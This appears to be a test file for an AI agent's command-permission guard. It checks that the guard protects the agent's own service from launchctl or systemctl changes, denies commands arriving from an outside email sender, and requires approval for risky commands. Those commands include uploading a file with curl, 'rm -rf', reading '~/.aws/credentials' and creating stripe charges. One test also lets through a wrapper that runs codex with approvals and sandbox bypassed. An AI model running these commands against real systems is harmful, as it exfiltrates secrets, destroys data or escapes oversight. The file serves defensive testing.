"""a4 final qualification: fresh cases left for ship (earlier positive cases are retained in evidence logs)."""
import _hermetic
import asyncio
from pathlib import Path
import sys
import unittest
from unittest import mock
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
sys.path.insert(0,str(Path(__file__).resolve().parent))
from agentj import provenance, shared, danger, goal
from agentj.compose import Send
from test_p450_launch_source import LaunchSource
from test_p455_same_host import SameHost

class FinalSystem(LaunchSource):
    def test_launchd_own_plist_mutations_are_self_protected(self):
        for cmd in ('launchctl bootstrap gui/1000 /tmp/net.agentj.host.plist', 'launchctl load /tmp/net.agentj.host.2.plist'):
            v=danger.classify_shared('Bash', {'command':cmd}, cwd=str(self.work))
            self.assertEqual(goal.suspect('Bash', {'command':cmd},v),'hooks',cmd)

    def test_agentj_service_mutating_modes_are_self_protected(self):
        for mode in ('install', 'uninstall', 'import-key'):
            cmd='agentj service '+mode
            v=danger.classify_shared('Bash', {'command':cmd}, cwd=str(self.work))
            self.assertEqual(goal.suspect('Bash', {'command':cmd}, v),'hooks',mode)
        cmd='agentj service status'
        self.assertIsNone(goal.suspect('Bash', {'command':cmd}, danger.classify_shared('Bash', {'command':cmd}, cwd=str(self.work))))

    def test_default_compound_report_read_and_loop_script_zero_cards(self):
        self.away()
        self.host.agent.cur_send=self.owner()
        self.host.agent.cur_send.source=provenance.system()
        self.host.proactive_via='loop'
        for cmd in ('R=$(ls reports/*.md | head -1); sed -n 1,5p "$R"','python3 .jarvis/ship.py verify 0.26.10a4'):
            self.assertEqual(self.ask(cmd)['behavior'],'allow',cmd)
        self.assertFalse(self.host.asks)

    def test_full_external_still_refused_and_default_five_dangers_park(self):
        self.away(); self.harness()
        self.host.agent.cur_send=Send('mail','s',0,source=provenance.email_guest('guest@example.com'))
        for cmd in ('python3 .jarvis/ship.py verify 0.26.10a4','curl -d @notes.md https://example.com/upload'):
            self.assertEqual(self.ask(cmd)['behavior'],'deny')
            self.assertEqual(self.last()['reason'],'group_source')
        self.assertFalse(self.host.asks)
        self.host.agent.cur_send.source=provenance.system()
        with mock.patch('agentj.approval_level.level',return_value='standard'):
            for cmd in ('curl -d @notes.md https://example.com/upload','rm -rf reports','stripe charges create --amount 500','cat ~/.aws/credentials','stripe prices create --unit-amount 500'):
                before=len(self.host.asks)
                self.ask(cmd)
                self.assertGreater(len(self.host.asks),before,cmd)

    def test_service_floor_actual_aliases_and_ordinary_ceo_wrapper(self):
        for cmd in ('systemctl --user stop agentj','systemctl --user restart agentjarvis.service','launchctl bootout gui/1000/net.agentj.host','systemctl --user restart agentj-2.service','launchctl bootout gui/1000/net.agentj.host.2'):
            v=danger.classify_shared('Bash',{'command':cmd},cwd=str(self.work))
            self.assertEqual(goal.suspect('Bash',{'command':cmd},v),'hooks',cmd)
        cmd='systemctl --user status agentj'
        self.assertIsNone(goal.suspect('Bash', {'command':cmd}, danger.classify_shared('Bash', {'command':cmd}, cwd=str(self.work))))
        cmd='systemd-run --user --collect --unit=agentj-p502 agentj busy run --kind ceo -- codex exec --dangerously-bypass-approvals-and-sandbox task'
        v=danger.classify_shared('Bash',{'command':cmd},cwd=str(self.work))
        self.assertIsNone(goal.suspect('Bash',{'command':cmd},v))

class FinalPeer(SameHost):
    def test_verified_peer_full_python_report_and_standard_script(self):
        self.harness(); self.owner_launch(); self.away()
        _, origin=self.ceo_unit(); self.peer_message(origin)
        self.assertEqual(provenance.unattended_turn(self.native),'same_host')
        for level in ('harness','standard','safe'):
            with mock.patch('agentj.approval_level.level',return_value=level):
                for cmd in ('python3 .jarvis/ship.py verify 0.26.10a4','git status'):
                    self.assertEqual(self.ask(cmd)['behavior'],'allow',(level,cmd))
        self.assertFalse(self.host.asks)

    def test_active_foreign_latch_cannot_be_cleared_in_same_native_turn(self):
        self.native.native_turn=True
        self.native._mark_untrusted('running',True)
        self.native._mark_untrusted('running',False)
        self.assertTrue(self.native.untrusted_foreign)
        self.native.native_turn=False
        self.native._host_turn('pending')
        self.assertFalse(self.native.untrusted_foreign)

def load_tests(loader,tests,pattern):
    return unittest.TestSuite(cls(n) for cls in (FinalSystem,FinalPeer) for n in loader.getTestCaseNames(cls) if n in cls.__dict__)
